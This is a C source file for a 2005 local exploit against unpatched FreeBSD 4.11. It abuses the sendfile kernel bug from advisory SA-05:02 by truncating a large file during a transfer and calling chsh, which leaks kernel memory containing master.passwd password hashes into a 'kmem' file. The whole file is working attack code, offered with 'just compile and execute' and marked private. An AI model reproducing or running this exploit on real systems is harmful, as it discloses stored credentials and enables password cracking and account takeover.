/*
** FreeBSD master.passwd disclosure exploit
** by kcope in 2005, kingcope[at]gmx.net
** thanks to revoguard
** just compile and execute .. look into the kmem file
** it contains the master.passwd
** tested on unpatched FreeBSD 4.11-RELEASE
** advisory: ftp://ftp.freebsd.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-05:02.sendfile.asc
** +++KEEP PRIV8+++
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/stat.h>
#include <stdio.h>
#include <fcntl.h>
#include <netinet/in.h>

#define BUF_SIZ 4096

void dolisten() {
       int s,c;
       struct sockaddr_in addr;
       struct sockaddr_in cli;
       socklen_t cli_size;
       char buf[BUF_SIZ];
       FILE *f=fopen("kmem", "w");

       addr.sin_addr.s_addr = INADDR_ANY;
       addr.sin_port = htons(31337);
       addr.sin_family = AF_INET;

       s = socket(PF_INET, SOCK_STREAM, 0);
       if (bind(s, (struct sockaddr*) &addr, sizeof(addr)) == -1)
       {
               perror("bind() failed");
               exit(1);
       }

       listen(s, 3);

       c = accept(s, (struct sockaddr*) &cli, &cli_size);

       while (recv(c, buf, sizeof(buf) - 1, 0) > 0) {
               fwrite(buf, sizeof(buf), 1, f);
       }

}

int main() {
       int input_fd,fd,s,k;
       struct stat file_info;
       off_t offset = 0;
               FILE *f;
       int i=0;
       struct sockaddr_in addr;
               char st[]="A";

               f=fopen("sendfile1", "w");
               for (i=0; i!=64000000; i++) {
                       fwrite(st, 1, 1, f);
               }
               fclose(f);

       input_fd = open ("sendfile1", O_RDWR);
       fstat (input_fd, &file_info);

       if (fork() != 0) {
       sleep(2);
               s = socket(PF_INET, SOCK_STREAM, 0);

               addr.sin_addr.s_addr = INADDR_ANY;
               addr.sin_port = htons(31337);
               addr.sin_family = AF_INET;

               if (connect(s, (struct sockaddr*) &addr, sizeof(addr)) == -1)
               {
                       perror("connect() failed");
                       return 2;
               }

               if (fork() != 0) {
               if (sendfile (input_fd, s, offset, 64000000, NULL, NULL, 0) == -1) {
                       perror("sendfile()");
               return -1;
               }
               } else {
                       f=fopen("sendfile1", "w");
                       fclose(f);
                       for (k=0;k!=10;k++)
                               system("/usr/bin/chsh -s /bin/sh");
                       wait();
               }
               } else {
                       dolisten();
                       wait();
               }
       return 0;
}
